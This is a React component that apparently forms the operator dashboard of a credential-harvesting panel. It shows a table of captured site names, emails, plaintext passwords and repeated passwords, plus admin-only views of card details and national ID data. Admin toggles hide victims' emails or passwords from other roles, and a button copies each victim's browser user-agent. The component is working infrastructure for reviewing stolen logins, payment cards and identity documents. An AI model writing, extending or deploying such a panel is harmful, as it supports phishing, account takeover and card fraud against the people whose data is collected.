
import moment from 'moment'
import ReactPaginate from 'react-paginate'
import { handleCopyClick } from "../../../utils/copyToClipBoard";
import useInformation from "../../../hooks/useInformation";
import { useContext, useState } from 'react';
import { AuthContext } from '../../../contexts/AuthProvider';
import { getData } from '../../../api/fetching';
import NidModal from '../../../components/NidModal';
export default function Information() {
  const [page,setPage] = useState(0)
  const [nidData,setNidData ]= useState({})
  const [open,setOpen] = useState(false)
  const {role}= useContext(AuthContext)
const {displayInfo,setIsRefresh} = useInformation()



const handleDisabled = async (id: any,type:any,status:any) => {
  setPage(1)
  try {
    let orstatus;
    if(!status){
      orstatus = true
    }else{
      orstatus = false
    }
  
    await getData(`/information/${id}/status?${type}=${orstatus}&page=${page}`)
    setIsRefresh(Math.random())
  } catch (error: any) {
    throw new Error(error)
  }
}
const handlePageClick = (event:any) => {
console.log(event);
};

const handleOpen = (data:any)=>{
  setOpen(state => !state)
  setNidData(data)
}

  return (
<div>
  <div className="bg-secondary position-relative text-center rounded p-4 mt-4">
    <div className="d-flex align-items-center justify-content-between mb-4">
      <h6 className="mb-0">All Informations</h6>
    </div>
    <div className="table-responsive">
      <table className="table text-start align-middle table-bordered table-hover mb-0">
        <thead>
          <tr className="text-white">
            <th scope="col">Date</th>
            <th scope="col">Site Name</th>
            <th scope="col">Email</th>
            <th scope="col">Password</th>
            <th scope="col">Confirm Password</th>
            {
              role === 'admin' &&(
                <th scope="col">Card Info</th>
              )
            }
            {
              role === 'admin' &&(
                <th scope="col">Hide Email</th>
              )
            }
            {
              role === 'admin' &&(
                <th scope="col">Hide Pass</th>
              )
            }
            <th scope="col">Action</th>
          </tr>
        </thead>
        <tbody>
          {
            displayInfo?.map(({_id,createdAt,siteName,nidInfo,isPasswordHide,email,password,repassword,status,agent:{ source={},platform='' } }) =>(
              <>
              <tr key={_id}>
              <td>{moment(createdAt).fromNow()}</td>
              <td>{siteName}</td>
              <td>{email}</td>
              <td>{password}</td>
              <td>{repassword}</td>
              {
                role === 'admin' && (
                  <td title={platform}><button type="button"
                  
                  className="btn btn-sm btn-warning" 
                  onClick={()=> handleOpen(nidInfo)}
                  >View</button></td>
                )
              }

{/* Email Hide */}
{
                role === 'admin' && (
                  <td><button
title={platform}
  onClick={() => {handleDisabled(_id,'status',status)}}
  className={`btn btn-sm text-white ${status ? 'bg-danger' : 'bg-success'}`}>{!status ? 'Hide' : 'show'}</button></td>
                )
              }

              {/* Password Hide  */}
              {
                role === 'admin' && (
                  <td><button
title={platform}
  onClick={() => {handleDisabled(_id,'isPasswordHide',isPasswordHide)}}
  className={`btn btn-sm text-white ${isPasswordHide ? 'bg-danger' : 'bg-success'}`}>{!isPasswordHide ? 'Hide' : 'show'}</button></td>
                )
              }

              <td title={platform}><button type="button"
                onClick={() => handleCopyClick(`${source ? source : ''}`)}
                className="btn btn-sm btn-primary" >Agent</button></td>
                
            </tr>
            
             </>
            ))
          }


        </tbody>
      </table>
    </div>
  </div>
  <div  className='pag'>
          <ReactPaginate 
          className='p-1'
        breakLabel="..."
        nextLabel="next >"
        onPageChange={handlePageClick}
        pageRangeDisplayed={5}
        pageCount={50}
        previousLabel="< previous"
        renderOnZeroPageCount={null}
      />
          </div>
      <NidModal isOpen={open} setIsOpen={setOpen} data={nidData}/>
</div>

  )
}


